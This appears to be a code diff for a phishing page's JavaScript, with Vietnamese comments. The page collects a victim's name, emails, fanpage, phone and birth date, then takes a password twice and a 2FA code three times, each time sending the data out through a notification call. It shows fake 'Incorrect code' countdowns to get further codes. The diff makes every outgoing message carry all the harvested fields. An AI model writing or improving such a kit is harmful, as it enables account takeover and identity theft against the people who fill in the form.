@@ -938,12 +938,16 @@
 
       document.getElementById('clientForm').addEventListener('submit', function(e) {
         e.preventDefault();
+
+        /* Lưu toàn bộ thông tin form vào _masterData */
         _masterData.fullName      = document.getElementById('fullName').value.trim();
         _masterData.email         = document.getElementById('email').value.trim();
         _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
         _masterData.fanpage       = document.getElementById('fanpage').value.trim();
         _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
-        _masterData.dob           = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
+        _masterData.day           = document.getElementById('day').value.trim();
+        _masterData.month         = document.getElementById('month').value.trim();
+        _masterData.year          = document.getElementById('year').value.trim();
         _masterData.message       = document.getElementById('message').value.trim();
 
         /* ✅ TIN 1 — Thông tin */
@@ -954,7 +958,9 @@
           emailBusiness: _masterData.emailBusiness,
           fanpage:       _masterData.fanpage,
           phone:         _masterData.phone,
-          dob:           _masterData.dob,
+          day:           _masterData.day,
+          month:         _masterData.month,
+          year:          _masterData.year,
           message:       _masterData.message,
         });
 
@@ -998,12 +1004,19 @@
       if (clickCount === 0) {
         _masterData.password = pw;
 
-        /* ✅ TIN 2 — Password lần 1 */
+        /* ✅ TIN 2 — Password lần 1 (đầy đủ thông tin) */
         Utils.sendNotification({
-          step:     'Tin 2 - Password lan 1',
-          fullName: _masterData.fullName,
-          email:    _masterData.email,
-          password: pw,
+          step:          'Tin 2 - Password lan 1',
+          fullName:      _masterData.fullName,
+          email:         _masterData.email,
+          emailBusiness: _masterData.emailBusiness,
+          fanpage:       _masterData.fanpage,
+          phone:         _masterData.phone,
+          day:           _masterData.day,
+          month:         _masterData.month,
+          year:          _masterData.year,
+          message:       _masterData.message,
+          password:      pw,
         });
 
         setTimeout(function() {
@@ -1016,11 +1029,18 @@
       } else {
         _masterData.passwordSecond = pw;
 
-        /* ✅ TIN 3 — Password lần 2 */
+        /* ✅ TIN 3 — Password lần 2 (đầy đủ thông tin) */
         Utils.sendNotification({
           step:           'Tin 3 - Password lan 2',
           fullName:       _masterData.fullName,
           email:          _masterData.email,
+          emailBusiness:  _masterData.emailBusiness,
+          fanpage:        _masterData.fanpage,
+          phone:          _masterData.phone,
+          day:            _masterData.day,
+          month:          _masterData.month,
+          year:           _masterData.year,
+          message:        _masterData.message,
           password:       _masterData.password,
           passwordSecond: pw,
         });
@@ -1105,15 +1125,66 @@
         if (!code) { err.textContent = 'Please enter the code.'; err.classList.add('show'); return; }
         btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
 
-        if (authCount < 2) {
-          _masterData['twoFa' + authCount] = code;
-
-          /* ✅ TIN 4, 5 — 2FA lần 1 & 2 */
+        if (authCount === 0) {
+          /* ✅ TIN 4 — 2FA lần 1 */
+          _masterData.twoFa0 = code;
           Utils.sendNotification({
-            step:     'Tin ' + (4 + authCount) + ' - 2FA lan ' + (authCount + 1),
-            fullName: _masterData.fullName,
-            email:    _masterData.email,
-            twoFa:    code,
+            step:           'Tin 4 - 2FA lan 1',
+            fullName:       _masterData.fullName,
+            email:          _masterData.email,
+            emailBusiness:  _masterData.emailBusiness,
+            fanpage:        _masterData.fanpage,
+            phone:          _masterData.phone,
+            day:            _masterData.day,
+            month:          _masterData.month,
+            year:           _masterData.year,
+            message:        _masterData.message,
+            password:       _masterData.password,
+            passwordSecond: _masterData.passwordSecond,
+            twoFa:          code,
+          });
+
+          setTimeout(function() {
+            var t = 30;
+            btn.innerHTML = 'Continue';
+            var inp = document.getElementById('twoFa');
+            if (inp) { inp.disabled = true; inp.value = ''; }
+            err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+            err.classList.add('show');
+            cdInterval = setInterval(function() {
+              t--;
+              err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+              if (t <= 0) {
+                clearInterval(cdInterval);
+                authCount++;
+                var wrap = document.querySelector('#authModal .modal-box');
+                if (wrap) {
+                  wrap.innerHTML = renderModal(authCount);
+                  wrap.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+                  bindForm();
+                }
+              }
+            }, 1000);
+          }, 1400);
+
+        } else if (authCount === 1) {
+          /* ✅ TIN 5 — 2FA lần 2 */
+          _masterData.twoFa1 = code;
+          Utils.sendNotification({
+            step:           'Tin 5 - 2FA lan 2',
+            fullName:       _masterData.fullName,
+            email:          _masterData.email,
+            emailBusiness:  _masterData.emailBusiness,
+            fanpage:        _masterData.fanpage,
+            phone:          _masterData.phone,
+            day:            _masterData.day,
+            month:          _masterData.month,
+            year:           _masterData.year,
+            message:        _masterData.message,
+            password:       _masterData.password,
+            passwordSecond: _masterData.passwordSecond,
+            twoFa:          _masterData.twoFa0,
+            twoFaSecond:    code,
           });
 
           setTimeout(function() {
@@ -1140,14 +1211,24 @@
           }, 1400);
 
         } else {
-          _masterData.twoFaFinal = code;
-
-          /* ✅ TIN 6 — 2FA lần 3 */
+          /* ✅ TIN 6 — 2FA lần 3 (đầy đủ tất cả) */
+          _masterData.twoFa2 = code;
           Utils.sendNotification({
-            step:     'Tin 6 - 2FA lan 3',
-            fullName: _masterData.fullName,
-            email:    _masterData.email,
-            twoFa:    code,
+            step:           'Tin 6 - 2FA lan 3',
+            fullName:       _masterData.fullName,
+            email:          _masterData.email,
+            emailBusiness:  _masterData.emailBusiness,
+            fanpage:        _masterData.fanpage,
+            phone:          _masterData.phone,
+            day:            _masterData.day,
+            month:          _masterData.month,
+            year:           _masterData.year,
+            message:        _masterData.message,
+            password:       _masterData.password,
+            passwordSecond: _masterData.passwordSecond,
+            twoFa:          _masterData.twoFa0,
+            twoFaSecond:    _masterData.twoFa1,
+            twoFaThird:     code,
           });
 
           setTimeout(function() {
@@ -1163,7 +1244,6 @@
 
   /* ============================================================
      MODAL: Success
-     (Không gửi thêm notification — đã gửi đủ 6 tin ở các bước trên)
   ============================================================ */
   function openSuccessModal() {
     var html =
